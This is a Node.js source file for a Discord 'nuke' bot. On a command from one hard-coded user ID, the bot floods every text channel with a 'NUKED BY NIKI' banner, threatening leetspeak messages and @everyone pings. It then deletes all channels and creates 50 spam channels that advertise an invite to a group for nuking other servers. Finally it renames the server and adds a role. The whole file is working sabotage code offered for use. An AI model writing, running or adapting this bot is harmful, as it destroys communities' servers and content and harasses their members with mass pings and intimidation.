require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, EmbedBuilder } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const PREFIX = process.env.PREFIX || '!';
const AUTHORIZED_ID = "1474433573174907054";

// ============================================================
// ASCII ART FOR NUKE
// ============================================================
const ASCII_BANNER = `
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║    ███╗   ██╗██╗██╗  ██╗██╗      █████╗ ██╗██╗         ║
║    ████╗  ██║██║██║ ██╔╝██║     ██╔══██╗██║██║         ║
║    ██╔██╗ ██║██║█████╔╝ ██║     ███████║██║██║         ║
║    ██║╚██╗██║██║██╔═██╗ ██║     ██╔══██║██║██║         ║
║    ██║ ╚████║██║██║  ██╗███████╗██║  ██║██║██║         ║
║    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝         ║
║                                                           ║
║              💀  NUKED BY NIKI  💀                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
`;

// ============================================================
// SCARY MESSAGES (HACKER STYLE)
// ============================================================
const SCARY_MESSAGES = [
    '@everyone @here **🔥 S3RV3R T4RG3T3D F0R D3STR0CT10N !**\n**💀 N1K1 H4S L4UNCH3D TH3 NUK3 !**',
    '@everyone @here **⚡ C0MPL3T3 0V3RR1D3 1N PR0GR3SS !**\n**👹 N0 0N3 C4N S4V3 Y0U !**',
    '@everyone @here **💀 D4T4 C0RRUPT10N 4CT1V4T3D !**\n**🔥 4LL CH4NN3LS W1LL B3 W1P3D !**',
    '@everyone @here **👹 R00T 4CC3SS 0BT41N3D !**\n**⚡ 3X3CUT1NG K1LL C0MM4ND !**',
    '@everyone @here **💀 4LL F1L3S 4R3 B31NG D3L3T3D !**\n**🔥 G4M3 0V3R !**',
    '@everyone @here **👹 SYST3M 0V3RR1D3 C0MPL3T3 !**\n**💀 Y0U H4V3 B33N H4CK3D !**'
];

// ============================================================
// SCARY IMAGES (Embed avec image de hacker)
// ============================================================
const HACKER_IMAGES = [
    'https://i.imgur.com/2wI8t0V.png',
    'https://i.imgur.com/3hqP4G6.png',
    'https://i.imgur.com/5VjN7pK.png',
    'https://i.imgur.com/8XqVp7M.png'
];

client.once('ready', () => {
    console.log(`✅ Connected as ${client.user.tag}`);
    console.log(`📊 ${client.guilds.cache.size} servers`);
    console.log(`🔧 Prefix: ${PREFIX}`);
    console.log(`👤 Authorized user ID: ${AUTHORIZED_ID}`);
    console.log('====================================');
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'vnuke') {
        await handleNuke(message);
    }
});

async function handleNuke(message) {
    if (message.author.id !== AUTHORIZED_ID) {
        return message.reply('❌ You are not authorized to use this command!');
    }

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ You need administrator permissions!');
    }

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ I need administrator permissions!');
    }

    await message.reply('💀 **NUKE INITIALIZED...**');

    const guild = message.guild;

    try {
        // 1. Send ASCII banner + scary messages + images in all channels
        const channels = guild.channels.cache;
        for (const [id, channel] of channels) {
            if (channel.type === ChannelType.GuildText) {
                try {
                    // ASCII Banner
                    await channel.send('```' + ASCII_BANNER + '```');
                    
                    // Scary message
                    await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
                    
                    // Hacker image embed
                    const embed = new EmbedBuilder()
                        .setColor(0xFF0000)
                        .setTitle('☠️ S3RV3R C0MPR0M1S3D !')
                        .setDescription('**Y0UR S3RV3R H4S B33N 1NF3CT3D !**\n**N1K1 1S 1N C0NTR0L !**')
                        .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
                        .setFooter({ text: '💀 NUKED BY NIKI' })
                        .setTimestamp();
                    await channel.send({ embeds: [embed] });
                } catch {}
            }
        }

        // 2. Delete all channels
        for (const [id, channel] of channels) {
            try {
                await channel.delete();
            } catch (e) {}
        }

        // 3. Create 50 new channels with hacker-style names
        const scaryNames = [
            'S3RV3R-0V3RR1D3', 'N1K1-1S-H3R3', 'Y0U-C4NT-3SC4P3', 'PR4Y-F0R-M3RCY', 'D34TH-1S-C0M1NG',
            'F0R3V3R-NUK3D', 'D3L3T3D-FR0M-3X1ST3NC3', 'G4M3-0V3R-M4N', 'N0-M3RCY', 'F1R3W4LL',
            'D4RK-S1D3', 'S4T4N-W4TCH3S', 'N1K1-3D1T10N', 'F0RG0TT3N-S0UL', 'V0ID-0F-D34TH',
            'D3STR0Y3R', '4N4RCHY', 'P4N1C-M0D3', 'D4WN-0F-NUK3', 'N3TFL1X-0F-D34TH',
            'BR4IN-R0T', 'K4RM4-1S-C0M1NG', 'NUK3-4G41N', 'C4RN4G3', 'CH40S-TH30RY',
            'D3M0N-SP4WN', 'PH3N1X-R1S3', 'R3B0RN-FR0M-4SH3S', 'NUK3D-4-L1F3', 'H3LL-1S-H3R3',
            'W3LC0M3-T0-H3LL', 'C0D3-R3D', 'BL4CK-H4T', 'CYB3R-PUNK', 'N3UR0-H4CK',
            'D4RKW3B', 'PH1SH1NG', 'R4NS0MW4R3', 'D0S-4TT4CK', 'SQL-1NJ3CT10N',
            'CRYPTO-J4CK', 'Z3R0-D4Y', 'RO0T-K1T', '3XPL01T', 'P4Y-L04D',
            'SHELL-C0D3', 'R3V3RS3', 'BUFF3R-0V3RFL0W', 'PR1V-3SC', 'C0R3-DUMP'
        ];

        const nukeMessages = [
            '@everyone @here **💀 4LL CH4NN3LS H4V3 B33N D3STR0Y3D !**\n**🔥 TH3 S3RV3R 1S N0W C0NTR0LL3D BY N1K1 !**\n\n**J01N TH3 D4RK S1D3 T0 NUK3 4NY S3RV3R:**\nhttps://discord.gg/eVTU7sW3wv',
            '@everyone @here **👹 SYST3M 0V3RR1D3 C0MPL3T3 !**\n**💀 Y0U H4V3 B33N H4CK3D !**\n\n**J01N TH3 D4RK S1D3 T0 NUK3 4NY S3RV3R:**\nhttps://discord.gg/eVTU7sW3wv',
            '@everyone @here **⚡ R00T 4CC3SS 0BT41N3D !**\n**🔥 3X3CUT1NG K1LL C0MM4ND !**\n\n**J01N TH3 D4RK S1D3 T0 NUK3 4NY S3RV3R:**\nhttps://discord.gg/eVTU7sW3wv'
        ];

        const inviteLink = 'https://discord.gg/eVTU7sW3wv';

        for (let i = 0; i < 50; i++) {
            const name = scaryNames[i % scaryNames.length] + '-' + (i + 1);
            try {
                const channel = await guild.channels.create({
                    name: name,
                    type: ChannelType.GuildText,
                });
                const msg = nukeMessages[i % nukeMessages.length] + `\n\n**J01N TH3 D4RK S1D3 : ${inviteLink}**`;
                await channel.send(msg);
                
                // Send ASCII banner in each new channel
                await channel.send('```' + ASCII_BANNER + '```');
            } catch (e) {}
        }

        // 4. Rename server
        try {
            await guild.setName('☠️ NUKED BY NIKI ☠️');
        } catch (e) {}

        // 5. Change server icon (if you have an image URL)
        // try {
        //     const iconURL = 'https://i.imgur.com/nuke.png';
        //     await guild.setIcon(iconURL);
        // } catch (e) {}

        // 6. Create special role with scary name
        try {
            const role = await guild.roles.create({
                name: '☠️ NIKI RULES ☠️',
                color: '#FF0000',
                hoist: true,
                mentionable: true
            });
            const botMember = guild.members.me;
            await botMember.roles.add(role);
        } catch (e) {}

        await message.channel.send('✅ **NUKE COMPLETE!**\n💀 Server destroyed by NIKI!\n☠️ **@everyone @here** The server is dead!');

    } catch (error) {
        console.error(error);
        await message.channel.send('❌ Error during nuke: ' + error.message);
    }
}

client.login(process.env.TOKEN);